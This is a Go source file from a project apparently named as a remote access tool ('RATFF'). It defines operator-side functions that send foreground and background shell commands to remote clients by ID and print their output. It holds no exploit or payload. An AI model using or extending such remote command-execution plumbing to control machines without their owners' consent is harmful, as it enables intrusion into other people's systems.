package client

import (
	"time"

	"RATFF/shared"
)

// PrintCommandResult is a function type for printing command results.
type PrintCommandResult func(stdout, stderr string, exitCode int)

// ShellCommand sends a shell command to a client and waits for response.
func (m *Manager) ShellCommand(id string, cmd string, printResult PrintCommandResult) {
	payload := map[string]interface{}{
		"client_id": id,
		"command":   "shell_exec",
		"payload":   map[string]interface{}{"cmd": cmd},
	}

	ch := make(chan shared.Message, 1)
	m.pendingMu.Lock()
	m.pendingCmd[id] = &PendingCommand{ch: ch}
	m.pendingMu.Unlock()

	if err := m.postCommand(payload); err != nil {
		m.Print.Error(m.Tf("send_command_failed", err))
		m.pendingMu.Lock()
		delete(m.pendingCmd, id)
		m.pendingMu.Unlock()
		return
	}

	select {
	case msg := <-ch:
		if msg.Payload != nil {
			stdout := ""
			stderr := ""
			exitCode := 0

			if v, ok := msg.Payload["stdout"]; ok {
				if s, ok := v.(string); ok {
					stdout = s
				}
			}
			if v, ok := msg.Payload["stderr"]; ok {
				if s, ok := v.(string); ok {
					stderr = s
				}
			}
			if v, ok := msg.Payload["exit_code"]; ok {
				if code, ok := v.(float64); ok {
					exitCode = int(code)
				} else if code, ok := v.(int); ok {
					exitCode = code
				}
			}

			printResult(stdout, stderr, exitCode)
		}
	case <-time.After(10 * time.Second):
		m.Print.Error(m.T("command_timeout"))
		m.pendingMu.Lock()
		delete(m.pendingCmd, id)
		m.pendingMu.Unlock()
	}
}

// BgCommand sends a background command to a client with optional output file.
func (m *Manager) BgCommand(id string, cmd string, outputFile string) {
	payload := map[string]interface{}{
		"client_id": id,
		"command":   "shell_exec_bg",
		"payload": map[string]interface{}{
			"cmd": cmd,
		},
	}

	if outputFile != "" {
		payload["payload"].(map[string]interface{})["output_file"] = outputFile
	}

	if err := m.postCommand(payload); err != nil {
		m.Print.Error(m.Tf("send_command_failed", err))
		return
	}

	if outputFile != "" {
		m.Print.Success(m.Tf("bg_command_started_with_output", cmd, outputFile))
	} else {
		m.Print.Success(m.Tf("bg_command_started", cmd))
	}
}
